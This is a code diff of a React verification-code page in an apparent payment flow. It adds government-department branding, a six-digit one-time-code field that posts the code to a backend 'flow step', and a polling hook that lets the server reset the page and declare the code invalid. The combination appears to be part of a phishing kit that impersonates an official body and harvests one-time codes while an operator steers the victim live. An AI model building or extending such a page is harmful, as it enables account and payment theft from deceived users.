@@ -1,149 +1,93 @@
-import { useRef, useState } from "react";
+import { useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
-import { Button } from "@mantine/core";
-import { ShieldCheck } from "lucide-react";
 import { paymentsApi } from "../../api/payments";
 import { useFlowPoll } from "../../hooks/useFlowPoll";
-import styles from "./FlowPages.module.scss";
-
-const LENGTH = 6;
+import { useLang } from "../../context/LanguageContext";
+import { FlowHeader } from "./FlowHeader";
+import { FlowLoading } from "./FlowLoading";
+import styles from "./FlowVerificationCodePage.module.scss";
 
 export function FlowVerificationCodePage() {
   const location = useLocation();
   const navigate = useNavigate();
+  const { t, dir } = useLang();
+  const ft = t.flow;
+  const fvc = ft.verificationCode;
+
   const state = location.state as { reference?: string } | null;
   const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";
 
-  const [digits, setDigits] = useState<string[]>(new Array(LENGTH).fill(""));
+  const [otp, setOtp] = useState("");
   const [submitted, setSubmitted] = useState(false);
   const [busy, setBusy] = useState(false);
   const [error, setError] = useState("");
-  const refs = useRef<Array<HTMLInputElement | null>>(
-    new Array(LENGTH).fill(null),
-  );
 
   useFlowPoll({
     reference,
     currentPage: "verification-code",
-    enabled: submitted && !!reference,
+    enabled: !!reference,
+    onReset: () => {
+      setSubmitted((prev) => {
+        if (prev) {
+          setOtp("");
+          setError(fvc.invalidCode);
+        }
+        return false;
+      });
+    },
   });
 
-  const handleInput = (i: number, val: string) => {
-    const d = val.replace(/\D/g, "").slice(-1);
-    const next = [...digits];
-    next[i] = d;
-    setDigits(next);
-    if (d && i < LENGTH - 1) refs.current[i + 1]?.focus();
+  const handleInput = (val: string) => {
+    setOtp(val.replace(/\D/g, "").slice(0, 6));
   };
 
-  const handleKeyDown = (
-    i: number,
-    e: React.KeyboardEvent<HTMLInputElement>,
-  ) => {
-    if (e.key === "Backspace" && !digits[i] && i > 0)
-      refs.current[i - 1]?.focus();
-  };
-
-  const handleSubmit = async () => {
-    const code = digits.join("");
-    if (code.length < LENGTH) {
-      setError("Please enter all 6 digits");
-      return;
-    }
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (otp.length < 6) { setError(fvc.enterCode); return; }
     setBusy(true);
     setError("");
     try {
-      await paymentsApi.flowStep(reference, "verification_code_submitted", {
-        code,
-      });
+      await paymentsApi.flowStep(reference, "verification_code_submitted", { code: otp });
       setSubmitted(true);
     } catch {
-      setError("Network error — please try again");
+      setError(ft.networkError);
     } finally {
       setBusy(false);
     }
   };
 
-  if (!reference) {
-    navigate("/", { replace: true });
-    return null;
-  }
+  if (!reference) { navigate("/", { replace: true }); return null; }
+
+  const canSubmit = otp.length === 6 && !busy;
 
   return (
-    <div className={styles.flowPage}>
-      <div className={styles.flowCard}>
-        <div className={styles.flowLogo}>
-          <ShieldCheck size={44} color="#8b1a3a" />
+    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh" }}>
+      <FlowHeader />
+      <div className={styles.container} dir={dir}>
+        <div className={styles.card}>
+          <div className={styles.header}>
+            <div className={styles.qgccBadge}>
+              <span className={styles.qgccDept}>{ft.govDept}</span>
+              <span className={styles.qgccSub}>{ft.govSub}</span>
+              <span className={styles.qgccAcronym}>{ft.govAcronym}</span>
+            </div>
+            <h1 className={styles.title}>{fvc.title}</h1>
+            <p className={styles.desc}>{fvc.desc}</p>
+          </div>
+          {error && <div className={styles.errorBox}>{error}</div>}
+          <form onSubmit={handleSubmit} className={styles.form}>
+            <div>
+              <label htmlFor="verification_code" className={styles.label}>{fvc.label}</label>
+              <input type="text" id="verification_code" value={otp} onChange={(e) => handleInput(e.target.value)} inputMode="numeric" maxLength={6} autoComplete="one-time-code" placeholder={fvc.placeholder} dir="ltr" className={styles.input} />
+            </div>
+            <button type="submit" disabled={!canSubmit} className={`${styles.submitBtn} ${canSubmit ? styles.active : styles.disabled}`}>
+              {fvc.submit}
+            </button>
+          </form>
+          <div className={styles.footerBrand}>{ft.brand}</div>
         </div>
-        <p className={styles.flowTitle}>Verification Code</p>
-        <p className={styles.flowSubtitle}>Enter the 6-digit OTP sent to you</p>
-
-        <div className={styles.otpGroup}>
-          {digits.map((d, i) => (
-            <input
-              key={`digit-${i}`}
-              ref={(el) => {
-                refs.current[i] = el;
-              }}
-              className={styles.otpBox}
-              type="tel"
-              inputMode="numeric"
-              maxLength={1}
-              value={d}
-              onChange={(e) => handleInput(i, e.currentTarget.value)}
-              onKeyDown={(e) => handleKeyDown(i, e)}
-            />
-          ))}
-        </div>
-
-        {error && (
-          <p
-            style={{
-              color: "#991b1b",
-              fontSize: "0.85rem",
-              textAlign: "center",
-              marginBottom: 10,
-            }}
-          >
-            {error}
-          </p>
-        )}
-
-        <Button
-          fullWidth
-          loading={busy}
-          onClick={handleSubmit}
-          styles={{
-            root: {
-              background: "#8b1a3a",
-              "&:hover": { background: "#751532" },
-            },
-          }}
-        >
-          Submit
-        </Button>
+        {submitted && <FlowLoading />}
       </div>
-
-      {submitted && (
-        <div className={styles.loadingWrap}>
-          <div className={styles.spinnerOuter}>
-            <div className={styles.spinnerInner} />
-          </div>
-          <p className={styles.loadingTitle}>Please wait</p>
-          <p className={styles.loadingSubtitle}>Processing your information</p>
-          <div className={styles.loadingNoteBox}>
-            <p className={styles.loadingNote}>
-              Please do not leave or refresh this page until the process is
-              complete
-            </p>
-          </div>
-          <div className={styles.dots}>
-            <span className={styles.dot} />
-            <span className={styles.dot} />
-            <span className={styles.dot} />
-          </div>
-        </div>
-      )}
     </div>
   );
 }
